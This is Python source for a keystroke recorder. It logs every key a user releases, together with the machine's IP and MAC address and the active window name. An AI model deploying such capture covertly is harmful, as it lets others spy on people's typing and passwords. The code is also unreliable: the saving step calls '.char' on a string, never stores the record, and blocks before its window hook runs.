from services.Recorder import Recorder
from db.KeystrokeDAO import KeystrokeDAO
import pynput
from models.Keystoke import Keystroke
from models.Annotation import Annotation


import gi
gi.require_version('Gtk', '3.0')
gi.require_version('Wnck', '3.0')
from gi.repository import Gtk, Wnck

class KeystrokeRecorder(Recorder):
    def __init__(self) -> None:
        super().__init__()
        self.ip = super().get_ip()
        self.mac = super().get_mac()
        self.ksDAO = KeystrokeDAO()
        self.listener = pynput.keyboard.Listener(on_release=self.on_release)
        self.listener.start()
        self.listener.join()
        wnck_scr = Wnck.Screen.get_default()
        wnck_scr.connect("active-window-changed", self.getWindow)
        Gtk.main()

    def on_release(self, key):
        try:
            self.save_keystroke(str(key.char))
        except Exception as e:
            raise e

    def save_keystroke(self, key):
        Keystroke(timestamp=super().get_timestamp(), ip_address=self.ip,
                  mac_address=self.mac, annotation=Annotation(self.ip, None), key=str(key.char))

    def stop(self):
        self.listener.stop()

    def start(self):
        self.listener.start()


    def getWindow(self, screen, previous_window):
        try:
            return screen.get_active_window().get_name()
        except AttributeError:
            pass
